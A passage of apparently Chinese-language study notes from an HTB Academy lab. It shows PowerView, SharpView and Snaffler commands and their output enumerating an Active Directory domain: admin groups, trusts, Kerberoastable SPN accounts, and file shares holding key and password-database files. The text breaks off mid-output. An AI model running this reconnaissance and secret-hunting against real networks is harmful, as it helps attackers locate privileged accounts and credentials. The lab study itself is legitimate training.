<h3 id="域用户信息"><a href="#域用户信息" class="headerlink" title="域用户信息"></a>域用户信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> mmorgan <span class="literal">-Domain</span> inlanefreight.local | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">name                 : Matthew Morgan</span><br><span class="line">samaccountname       : mmorgan</span><br><span class="line">description          :</span><br><span class="line">memberof             : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar</span><br><span class="line">                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security</span><br><span class="line">                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="built_in">H</span> Drive,OU=Security</span><br><span class="line">                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...&#125;</span><br><span class="line">whencreated          : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">5</span>:<span class="number">37</span>:<span class="number">06</span> PM</span><br><span class="line">pwdlastset           : <span class="number">11</span>/<span class="number">18</span>/<span class="number">2021</span> <span class="number">10</span>:<span class="number">02</span>:<span class="number">57</span> AM</span><br><span class="line">lastlogontimestamp   : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">34</span>:<span class="number">25</span> PM</span><br><span class="line">accountexpires       : NEVER</span><br><span class="line">admincount           : <span class="number">1</span></span><br><span class="line">userprincipalname    : mmorgan@inlanefreight.local</span><br><span class="line">serviceprincipalname :</span><br><span class="line">mail                 :</span><br><span class="line">useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH</span><br></pre></td></tr></table></figure>

<h3 id="递归组成员身份"><a href="#递归组成员身份" class="headerlink" title="递归组成员身份"></a>递归组成员身份</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt;  <span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Recurse</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Domain Admins</span><br><span class="line">GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : svc_qualys</span><br><span class="line">MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5613</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Domain Admins</span><br><span class="line">GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : <span class="built_in">sp</span><span class="literal">-admin</span></span><br><span class="line">MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5228</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Secadmins</span><br><span class="line">GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : spong1990</span><br><span class="line">MemberDistinguishedName : CN=Maggie</span><br><span class="line">                          Jablonski,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1965</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="信任枚举"><a href="#信任枚举" class="headerlink" title="信任枚举"></a>信任枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainTrustMapping</span></span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM </span><br></pre></td></tr></table></figure>

<h3 id="本地管理员访问权限测试"><a href="#本地管理员访问权限测试" class="headerlink" title="本地管理员访问权限测试"></a>本地管理员访问权限测试</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Test-AdminAccess</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line"></span><br><span class="line">ComputerName    IsAdmin</span><br><span class="line"><span class="literal">------------</span>    <span class="literal">-------</span></span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span>    True </span><br></pre></td></tr></table></figure>

<h3 id="查找已设置-SPN-的用户"><a href="#查找已设置-SPN-的用户" class="headerlink" title="查找已设置 SPN 的用户"></a>查找已设置 SPN 的用户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Properties</span> samaccountname,ServicePrincipalName</span><br><span class="line"></span><br><span class="line">serviceprincipalname                          samaccountname</span><br><span class="line"><span class="literal">--------------------</span>                          <span class="literal">--------------</span></span><br><span class="line">adfsconnect/azure01.inlanefreight.local       adfs</span><br><span class="line">backupjob/veam001.inlanefreight.local         backupagent</span><br><span class="line">d0wngrade/kerberoast.inlanefreight.local      d0wngrade</span><br><span class="line">kadmin/changepw                               krbtgt</span><br><span class="line">MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span> sqldev</span><br><span class="line">MSSQLSvc/SPSJDB.inlanefreight.local:<span class="number">1433</span>      sqlprod</span><br><span class="line">MSSQLSvc/SQL<span class="literal">-CL01-01inlanefreight</span>.local:<span class="number">49351</span> sqlqa</span><br><span class="line">sts/inlanefreight.local                       solarwindsmonitor</span><br><span class="line">testspn/kerberoast.inlanefreight.local        testspn</span><br><span class="line">testspn2/kerberoast.inlanefreight.local       testspn2</span><br></pre></td></tr></table></figure>

<h2 id="9-SharpView"><a href="#9-SharpView" class="headerlink" title="9. SharpView"></a>9. SharpView</h2><h3 id="枚举有关特定用户"><a href="#枚举有关特定用户" class="headerlink" title="枚举有关特定用户"></a>枚举有关特定用户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\SharpView.exe <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> forend</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[<span class="built_in">Get-DomainUser</span>] <span class="keyword">filter</span> string: (&amp;(samAccountType=<span class="number">805306368</span>)(|(samAccountName=forend)))</span><br><span class="line">objectsid                      : &#123;S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5614</span>&#125;</span><br><span class="line">samaccounttype                 : USER_OBJECT</span><br><span class="line">objectguid                     : <span class="number">53264142</span><span class="literal">-082a-4cb8-8714-8158b4974f3b</span></span><br><span class="line">useraccountcontrol             : NORMAL_ACCOUNT</span><br><span class="line">accountexpires                 : <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span> <span class="number">4</span>:<span class="number">00</span>:<span class="number">00</span> PM</span><br><span class="line">lastlogon                      : <span class="number">4</span>/<span class="number">18</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">01</span>:<span class="number">21</span> PM</span><br><span class="line">lastlogontimestamp             : <span class="number">4</span>/<span class="number">9</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">33</span>:<span class="number">21</span> PM</span><br><span class="line">pwdlastset                     : <span class="number">2</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">03</span>:<span class="number">45</span> PM</span><br><span class="line">lastlogoff                     : <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span> <span class="number">4</span>:<span class="number">00</span>:<span class="number">00</span> PM</span><br><span class="line">badPasswordTime                : <span class="number">4</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">09</span>:<span class="number">07</span> AM</span><br><span class="line">name                           : forend</span><br><span class="line">distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">whencreated                    : <span class="number">2</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">03</span>:<span class="number">45</span> PM</span><br><span class="line">whenchanged                    : <span class="number">4</span>/<span class="number">9</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">33</span>:<span class="number">21</span> PM</span><br><span class="line">samaccountname                 : forend</span><br><span class="line">memberof                       : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="built_in">H</span> Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&#125;</span><br><span class="line">cn                             : &#123;forend&#125;</span><br><span class="line">objectclass                    : &#123;top, person, organizationalPerson, user&#125;</span><br><span class="line">badpwdcount                    : <span class="number">0</span></span><br><span class="line">countrycode                    : <span class="number">0</span></span><br><span class="line">usnchanged                     : <span class="number">3259288</span></span><br><span class="line">logoncount                     : <span class="number">26618</span></span><br><span class="line">primarygroupid                 : <span class="number">513</span></span><br><span class="line">objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">dscorepropagationdata          : &#123;<span class="number">3</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">58</span>:<span class="number">07</span> PM, <span class="number">3</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">57</span>:<span class="number">44</span> PM, <span class="number">3</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">52</span>:<span class="number">58</span> PM, <span class="number">3</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">49</span>:<span class="number">31</span> PM, <span class="number">7</span>/<span class="number">14</span>/<span class="number">1601</span> <span class="number">10</span>:<span class="number">36</span>:<span class="number">49</span> PM&#125;</span><br><span class="line">usncreated                     : <span class="number">3054181</span></span><br><span class="line">instancetype                   : <span class="number">4</span></span><br><span class="line">codepage                       : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="10-Snaffler"><a href="#10-Snaffler" class="headerlink" title="10. Snaffler"></a>10. Snaffler</h2><h3 id="Snaffler-执行"><a href="#Snaffler-执行" class="headerlink" title="Snaffler 执行"></a>Snaffler 执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data</span><br></pre></td></tr></table></figure>

<h3 id="Snaffler-实战"><a href="#Snaffler-实战" class="headerlink" title="Snaffler 实战"></a>Snaffler 实战</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\Snaffler.exe  <span class="literal">-d</span> INLANEFREIGHT.LOCAL <span class="literal">-s</span> <span class="literal">-v</span> <span class="keyword">data</span></span><br><span class="line"></span><br><span class="line"> .::::::.:::.    :::.  :::.    .-:::::<span class="string">&#x27;.-:::::&#x27;</span>:::    .,:::::: :::::::..</span><br><span class="line">;;;`    ``;;;;,  `;;;  ;;`;;   ;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;    ;;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;;``;;;;</span><br><span class="line"><span class="string">&#x27;[==/[[[[, [[[[[. &#x27;</span>[[ ,[[ <span class="string">&#x27;[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[[&#x27;</span></span><br><span class="line">  <span class="string">&#x27;&#x27;</span><span class="string">&#x27;    $ $$$ &#x27;</span><span class="type">Y</span><span class="variable">$c</span><span class="variable">$</span><span class="variable">$c</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$cc</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$c</span>`$<span class="variable">$</span><span class="variable">$</span><span class="string">&#x27;`` `$$$&#x27;</span>`` <span class="variable">$</span><span class="variable">$</span><span class="string">&#x27;     $$&quot;&quot;   $$$$$$c</span></span><br><span class="line"><span class="string"> 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b &#x27;</span><span class="number">88</span><span class="type">bo</span>,</span><br><span class="line">  <span class="string">&#x27;YMmMY&#x27;</span>  <span class="type">MMM</span>     <span class="type">YM</span> <span class="type">YMM</span>   <span class="string">&#x27;&#x27;</span>` <span class="string">&#x27;MM,    &#x27;</span><span class="type">MM</span>,  <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="type">YUMMM</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="type">YUMMMMMMM</span>   <span class="string">&#x27;W&#x27;</span></span><br><span class="line">                         <span class="type">by</span> <span class="type">l0ss</span> <span class="type">and</span> <span class="type">Sh3r4</span> - <span class="type">github.com</span>/<span class="type">SnaffCon</span>/<span class="type">Snaffler</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Black</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01.INLANEFREIGHT.LOCAL</span>\<span class="type">ADMIN</span><span class="variable">$</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Black</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01.INLANEFREIGHT.LOCAL</span>\<span class="type">C</span><span class="variable">$</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MX01.INLANEFREIGHT.LOCAL</span>\<span class="type">address</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">User</span> <span class="type">Shares</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">ZZZ_archive</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">18</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">CA01.INLANEFREIGHT.LOCAL</span>\<span class="type">CertEnroll</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.kdb</span><span class="variable">$</span>|<span class="number">289</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">22</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">GroupBackup.kdb</span>) <span class="type">.kdb</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">299</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">33</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">ShowReset.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">FILE.INLANEFREIGHT.LOCAL</span>\<span class="type">UpdateServicesPackages</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.kwallet</span><span class="variable">$</span>|<span class="number">302</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">45</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">WriteUse.kwallet</span>) <span class="type">.kwallet</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">298</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">10</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">ProtectStep.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.ppk</span><span class="variable">$</span>|<span class="number">275</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">40</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">StopTrace.ppk</span>) <span class="type">.ppk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">301</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">17</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">WaitClear.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.sqldump</span><span class="variable">$</span>|<span class="number">312</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">30</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">DenyRedo.sqldump</span>) <span class="type">.sqldump</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span 